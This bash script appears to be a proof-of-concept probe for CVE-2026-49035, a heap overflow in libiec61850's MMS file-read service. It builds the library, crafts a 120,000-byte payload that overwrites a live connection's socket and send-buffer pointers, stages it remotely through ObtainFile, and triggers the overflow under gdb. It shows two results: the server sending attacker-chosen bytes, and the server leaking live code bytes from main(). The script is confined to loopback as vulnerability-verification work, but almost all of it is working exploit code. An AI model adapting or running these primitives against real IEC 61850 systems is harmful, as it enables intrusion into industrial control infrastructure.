#!/usr/bin/env bash
# Rung-4 pointer-control probe for CVE-2026-49035. Loopback only.
#   bash r4_pointer.sh <absolute-outdir>
#
# Extends r4_probe.sh: remotely staged bytes (pinned ObtainFile client) set a
# live CotpConnection pointer field to a chosen fake Socket object and a chosen
# send buffer, so the unsanitized server dereferences them and puts chosen bytes
# on the wire. A second case points the same field at main() and reads live
# code bytes. Addresses are those of this host's gdb (ASLR disabled) build and
# are VERIFIED at run time; a mismatch is a FAIL, never a silent pass.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=${1:-"$HERE/r4-pointer-out"}
mkdir -p "$OUT"
cd "$HERE" || exit 2
OUT=$(cd "$OUT" && pwd)
cd "$HERE/src" || exit 2
sha256sum -c SHA256SUMS > "$OUT/pins.log" 2>&1 || exit 2
cd "$HERE" || exit 2

B="$OUT/build"
rm -rf "$B"
mkdir -p "$B" || exit 2
tar -xzf "$HERE/src/libiec61850-a1396111.tar.gz" -C "$B" || exit 2
tar -xzf "$HERE/src/libiec-security-poc-main.tar.gz" -C "$B" || exit 2
V=$(find "$B" -maxdepth 1 -type d -name 'libiec61850-a1396111*' | head -1)
P="$B/libiec-security-poc-main/CVE-2026-49035-mms-fileread-heap-rce"
[ -n "$V" ] && [ -f "$P/rce/exploit.py" ] && [ -f "$P/poc/raw/exploit_raw.py" ] || exit 2
cmake -S "$V" -B "$B/plain" -DCMAKE_BUILD_TYPE=Debug \
  -DCMAKE_C_FLAGS='-g -O0 -fno-omit-frame-pointer' > "$B/cmake.log" 2>&1 || exit 2
cmake --build "$B/plain" --target server_example_files -- -j4 >> "$B/cmake.log" 2>&1 || exit 2
SDIR="$B/plain/examples/server_example_files"
mkdir -p "$SDIR/vmd-filestore" || exit 2

# Case payloads. Every byte is staged remotely by the pinned ObtainFile client.
cat > "$OUT/mkpayload.py" <<'PY'
import struct, sys
BASE = 0x7ffff0010ae0       # gdb, ASLR off, pinned plain build on this host
BUFPOS = 19
FAKE = BASE + 100000        # fake Socket{fd=4} inside the overflow range
MARK = BASE + 101000        # chosen marker inside the overflow range
MAIN = 0x555555564cf2       # gdb, ASLR off, main() of the pinned plain build
mode, path = sys.argv[1], sys.argv[2]

def fi(addr):
    return addr - BASE - BUFPOS

p = bytearray(i % 256 for i in range(120000))
p[fi(BASE + 81672):fi(BASE + 81672) + 8] = struct.pack("<Q", FAKE)          # cotp->socket
p[fi(BASE + 81728):fi(BASE + 81728) + 8] = struct.pack("<Q", MARK if mode == "marker" else MAIN)  # ext buffer
p[fi(BASE + 81736):fi(BASE + 81736) + 4] = struct.pack("<i", 1024)          # ext size
p[fi(BASE + 81740):fi(BASE + 81740) + 4] = struct.pack("<i", 16)            # ext fill
p[fi(FAKE):fi(FAKE) + 4] = struct.pack("<i", 4)                             # real socket fd
if mode == "marker":
    p[fi(MARK):fi(MARK) + 16] = b"\x03\x00\x00\x10IEC61850-R4!"
open(path, "wb").write(p)
print("payload_sha256=" + __import__("hashlib").sha256(p).hexdigest())
PY

cat > "$OUT/stage.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("pinned", sys.argv[1])
m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
data = open(sys.argv[3], "rb").read()
ok = m.stage_file("127.0.0.1", int(sys.argv[2]), data, "REMOTE.BIN")
print("stage_return=" + str(ok))
PY

cat > "$OUT/trigger.gdb" <<'GDB'
set pagination off
set confirm off
break mms_file_service.c:872
commands
silent
printf "=== BASE %p bufPos=%d chunk=%u ===\n", response->buffer, bufPos, fileChunkSize
continue
end
break Socket_write
commands
silent
if size == 16
  printf "=== CHOSEN SEND self=%p buf=%p size=%d ===\n", self, buf, size
  x/16xb buf
end
continue
end
run PORT
GDB

pass=0; fail=0
check() { if [ "$2" = 1 ]; then echo "PASS $1"; pass=$((pass+1));
          else echo "FAIL $1"; fail=$((fail+1)); fi; }
stop() { kill "$1" 2>/dev/null; wait "$1" 2>/dev/null; }
sha() { sha256sum "$1" | cut -d' ' -f1; }

run_case() { # <mode> <stage-port> <trigger-port>
  local mode=$1 sp=$2 tp=$3 tag="$OUT/$1"
  python3 "$OUT/mkpayload.py" "$mode" "$tag.bin" > "$tag.payload.log" 2>&1 || return 2
  HASH=$(grep -o 'payload_sha256=[0-9a-f]*' "$tag.payload.log" | cut -d= -f2)
  # The stock server refuses ObtainFile when the destination already exists.
  rm -f "$SDIR/vmd-filestore/REMOTE.BIN"
  ( cd "$SDIR" && timeout 30 ./server_example_files "$sp" ) > "$tag.stage.server.log" 2>&1 &
  local srv=$!
  sleep 3
  python3 "$OUT/stage.py" "$P/rce/exploit.py" "$sp" "$tag.bin" > "$tag.stage.client.log" 2>&1
  stop "$srv"
  grep -q 'ObtainFile complete' "$tag.stage.client.log"
  check "$mode: ObtainFile staged remotely chosen payload" "$([ $? -eq 0 ] && echo 1 || echo 0)"
  [ "$(sha "$SDIR/vmd-filestore/REMOTE.BIN")" = "$HASH" ]
  check "$mode: staged file sha256 equals crafted payload" "$([ $? -eq 0 ] && echo 1 || echo 0)"

  sed "s/PORT/$tp/" "$OUT/trigger.gdb" > "$tag.run.gdb"
  ( cd "$SDIR" && timeout 40 gdb -q -batch -x "$tag.run.gdb" \
      --args ./server_example_files "$tp" > "$tag.gdb.log" 2>&1 ) &
  local gdbpid=$!
  sleep 6
  python3 "$P/poc/raw/exploit_raw.py" 127.0.0.1 "$tp" REMOTE.BIN 1 \
    > "$tag.client.log" 2>&1
  sleep 2
  stop "$gdbpid"
  grep -q '=== BASE 0x7ffff0010ae0 bufPos=19 chunk=120000 ===' "$tag.gdb.log"
  check "$mode: expected sendBuffer base verified under gdb" "$([ $? -eq 0 ] && echo 1 || echo 0)"
  if [ "$mode" = marker ]; then
    grep -q '=== CHOSEN SEND self=0x7ffff0029180 buf=0x7ffff0029568 size=16 ===' "$tag.gdb.log"
    check "marker: chosen fake Socket and buffer pointers dereferenced" "$([ $? -eq 0 ] && echo 1 || echo 0)"
    grep -q 'RECV FileRead response] 16 bytes: 0300001049454336313835302d523421' "$tag.client.log"
    check "marker: chosen marker read back over loopback wire" "$([ $? -eq 0 ] && echo 1 || echo 0)"
  else
    grep -q '=== CHOSEN SEND self=0x7ffff0029180 buf=0x555555564cf2 size=16 ===' "$tag.gdb.log"
    check "read: chosen live code address dereferenced" "$([ $? -eq 0 ] && echo 1 || echo 0)"
    grep -q 'f3.*0f.*1e.*fa' "$tag.gdb.log"
    check "read: gdb sees endbr64 at chosen code address" "$([ $? -eq 0 ] && echo 1 || echo 0)"
    grep -q 'not a TPKT frame (header: f30f1efa)' "$tag.client.log"
    check "read: live code bytes disclosed on loopback wire" "$([ $? -eq 0 ] && echo 1 || echo 0)"
  fi
}

run_case marker 10150 10151
run_case read   10152 10153

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL CHECKS PASS rc 0"; exit 0; }
echo "SOME CHECKS FAILED rc 1"; exit 1
